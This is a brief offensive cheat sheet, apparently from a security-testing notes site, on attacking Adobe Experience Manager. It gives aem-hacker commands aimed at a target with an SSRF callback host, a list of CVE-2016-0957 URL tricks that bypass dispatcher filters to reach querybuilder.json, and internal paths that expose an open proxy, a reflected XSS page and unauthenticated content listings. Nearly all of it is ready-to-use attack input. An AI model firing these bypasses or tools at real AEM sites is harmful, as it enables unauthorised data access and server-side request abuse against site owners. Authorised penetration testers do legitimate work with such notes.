# Adobe AEM

## Tools

```bash
# https://github.com/0ang3el/aem-hacker
python3 aem_discoverer.py --file list.txt
python3 aem_hacker.py -u https://target.com --host [SSRF_CALLBACK]
#https://github.com/emadshanab/Adobe-Experience-Manager/blob/main/aem-paths.txt
#https://github.com/Raz0r/aemscan
```

## Vulns

### CVE-2016-0957 - Bypass dispatcher filters

```bash
https://aemsite/bin/querybuilder.json/a.css
https://aemsite/bin/querybuilder.json/a.html
https://aemsite/bin/querybuilder.json/a.ico
https://aemsite/bin/querybuilder.json/a.png
https://aemsite/bin/querybuilder.json;%0aa.css
https://aemsite/bin/querybuilder.json/a.1.json
https://aemsite///bin///querybuilder.json
https://aemsite///etc.json

#Depending on the version and configuration of the affected AEM installation, the above vulnerability could expose the Publish tier to a number of vulnerabilities, including:
# Provides a proxy which is able to be used to perform arbitrary server-side requests.
/libs/opensocial/proxy
# Exposes a reflected Cross-Site Scripting (XSS) vulnerability in older versions of AEM 5.X.
/etc/mobile/useragent-test.html
# Exposes an unauthenticated, browsable view of all content in the repository which may lead to information disclosure.
/etc/reports/diskusage.html
```

{% embed url="https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps" %}

